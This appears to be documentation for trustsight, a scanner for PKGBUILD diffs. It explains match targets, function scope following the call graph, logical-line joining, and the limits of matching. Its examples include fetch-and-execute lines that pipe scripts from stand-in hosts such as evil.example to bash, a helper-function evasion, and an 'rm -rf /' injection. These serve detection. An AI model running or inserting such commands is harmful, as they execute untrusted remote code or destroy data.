<!-- description: How match_target, scope and logical-line joining decide what a rule can see, and the limits of that matching. -->

# Rule Matching

A rule is a pattern or a condition plus a statement about **what it is
applied to**. `match_target` selects the surface, `scope` narrows the lines,
and logical-line joining decides what counts as one line. Those three choices
explain most false positives and most misses.

## Matching target

PKGBUILDs encode meaning at two levels. The text of the file declares structure (variables, arrays, function boundaries). The resolved values of those variables determine what actually runs. Rules target one or the other:

- **`resolved` target**: the rule pattern is applied to the post-variable-expansion value of each function body and source array. This catches patterns hidden behind variables: `curl $url | $shell` in the diff becomes `curl https://evil.com/hook.sh | bash` after resolution.
- **`raw_line` target**: the rule pattern is applied to the literal diff line with the `+`/`-` prefix stripped. This catches patterns in the PKGBUILD structure itself: a `sha256sums=('SKIP')` declaration or a unicode bidi override character.

Some patterns are only visible at the raw level (structure, declarations, unicode characters). Some are only meaningful after resolution (actual URLs, command strings). The two-target design covers both surfaces.

Both targets see *logical* lines, not physical ones. A shell continuation is joined before matching, so a command split across a trailing backslash is still matched as a whole:

```bash
curl \
  https://evil.example/x.sh | bash
```

Rules match one line at a time, so without this the pipe-to-shell patterns would see only `curl \`. Only lines carrying the same diff marker are joined, so an addition is never spliced onto a removal.

## Scope

Scope restricts which lines a `raw_line` rule checks. Without scope, a rule like R010 (`curl`) would fire on every line containing the word `curl`, including comments and messages that merely mention it. The `function_body` scope restricts matching to lines inside `build()`, `package()`, `check()`, and similar functions where commands actually execute.

Scope is set per-rule in `rules.toml`. When absent, the rule matches all lines. Scope has no effect on `resolved`-target rules because resolution already strips comments and top-level declarations. The fetch-and-execute shape rules (R001, R002, R003, R045) are the one exception: they also stand down in the `message` context, because a pipeline written inside a printer's quoted text is output for the reader, not a command the build runs. A line that also carries an unquoted chain or redirect is execution, not a message, so a real `curl ... | bash` still fires.

The `message` context applies only when a line is *nothing but* a message. A shell line does not end at its first command, so `echo "x"; sudo rm -rf /` is an execution context, not a message, and `echo "$(curl evil | bash)"` runs a command substitution inside the quotes. Any command separator (`;`, `&`, `|`) or substitution (`$(`, backtick) after the message keyword disqualifies the line, which is what stops a short prefix from switching a scoped rule off.

A scope entry may also name the enclosing function rather than a generic context. This distinguishes cases that `function_body` alone cannot: `curl` inside `build()` is routine, while `curl` inside `pkgver()` reaches the network during version resolution, before any review step. R051 uses `scope = ["pkgver"]` for exactly this.

A named scope asks whether the code *runs* during that function, not whether it is written inside one, and those are different questions because the reviewed party chooses the function names:

```bash
_fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
build()  { _fetch; bash "$srcdir/x.sh"; }
```

`_fetch` is not `build`, so keying on the enclosing name let a rename work as an evasion. Scope therefore follows the call graph: a line resolves to every function whose execution reaches it, transitively and through `$(...)`. The graph is built over the whole current PKGBUILD where the analysis has it, not only the diff hunk, so a helper added by one diff still connects to the `build()` that calls it from unchanged lines. `ScopeResolver` in `src/trustsight/rules/_scope.py` is the single implementation, shared by the config-driven `scope` field and by the rules in `analysis/build.py` and `analysis/delivery/` that ask the same question in Python.

A finding names the indirection rather than claiming the wrong location: `_fetch(), called from build() downloads ...`, so the reader is sent to the line that holds the code.

Note that a *bare* function header (`build() {`) is classified as `other`, not `function_body`: the context applies to the lines *inside* the braces. A header that also carries code, though, is `function_body`, because that code really does run there: `build() { curl evil | bash; }` is matched by `function_body`-scoped rules, and the context does not leak to the lines that follow.

A pattern that matches the header while scoping itself to `function_body` therefore misses the ordinary multi-line form and only fires on single-line definitions; `trustsight lint-rules` reports this as `scope-contradiction`.

Function detection reads both Bash spellings - `build() {` and
`function build {`, with or without parentheses - and names containing
hyphens, so a scoped rule is not blind inside `function package_foo-bin {`.

Scope classification is also **shell-file aware**: lines from a companion file
whose extension is not a shell one (`.json`, `.gn`, `.patch`, `.fish`, and the
rest) are blanked before function membership is decided, so a `build() {`
inside a `.desktop` file or a patch cannot place the rest of that file inside a
function makepkg calls. `PKGBUILD`, `*.install`, `*.sh`, `*.bash` and `*.zsh`
are shell; an extensionless companion is treated as shell too, because it may
be a script the recipe executes.

## Matching limitations

- A `resolved` rule can only see what the tokenizer can resolve. An assignment
  it refuses is not matched against, and the refusal is reported as a coverage
  boundary rather than guessed at.
- A `raw_line` rule matches one logical line at a time. A payload assembled
  across a function call, a heredoc, or a file the analysis does not read is
  outside the pattern's reach; the structural and heuristic series exist for
  those shapes.
- Scope follows the call graph, so a renamed helper does not escape a function
  scope. It cannot follow dynamic dispatch, `eval`, or a function whose body is
  generated at build time.
- Matching never executes the recipe. A value that only exists at build time
  remains unresolved and is reported as uncertainty, not inferred.

The fields themselves are in [Rule Configuration](configuration.md). The
evidence tier a matched rule contributes to is defined in
[Evidence Tiers](../reference/evidence-tiers.md).

